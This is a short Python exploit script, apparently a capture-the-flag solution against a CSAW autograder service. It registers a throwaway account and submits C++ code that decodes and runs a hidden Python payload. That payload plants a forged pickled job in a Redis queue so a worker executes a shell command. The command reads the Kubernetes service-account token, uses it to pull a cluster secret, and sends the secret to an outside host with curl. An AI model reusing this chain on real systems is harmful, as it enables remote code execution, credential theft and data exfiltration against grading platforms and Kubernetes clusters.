import sys, base64, requests, random, string, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

domain = 'autograder.chal.csaw.io'

redisrce=b"""
import redis, datetime, pickle, zlib
cmd = 'curl http://athena.sh:5000/ --data "$(curl -ik -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/anubis/secrets/flag)"'
r = redis.Redis('redis')
r.hmset('rq:job:22489f11-fc24-43a7-b16e-0edff0cd4f12',{b'started_at':b'',b'ended_at':b'',b'description':b'',b'status':b'queued',b'created_at':b'2020-10-27T16:01:44.051118Z',b'data':zlib.compress(pickle.dumps(('posix.system',None,(cmd,),{}))),b'timeout':b'180',b'origin':b'default',b'enqueued_at':datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%S.%fZ')})
r.lpush('rq:queue:default', '22489f11-fc24-43a7-b16e-0edff0cd4f12')
"""

cpp = """#include <iostream>
int main() {{system("echo -n '{code}' | base64 -d | python3 -");}}
""".format(code=base64.b64encode(redisrce).decode())


session = requests.Session()
r = session.get(
    'https://{}/api/public/register'.format(domain),
    params={
        'username': ''.join(random.choice(string.ascii_letters) for _ in range(20)),
        'password': ''.join(random.choice(string.ascii_letters) for _ in range(20)),
    },
    verify=False,
    allow_redirects=False
)
print(r, r.text, r.url)

r = session.post(
    'https://{}/api/public/submit/A9FBD997AA5B01D43682EE2920364B147C12C9B59886C9473FAEA9C65C6970D4'.format(domain),
    data={
        'code': cpp
    },
    verify=False,
    allow_redirects=False
)
print(r, r.text)
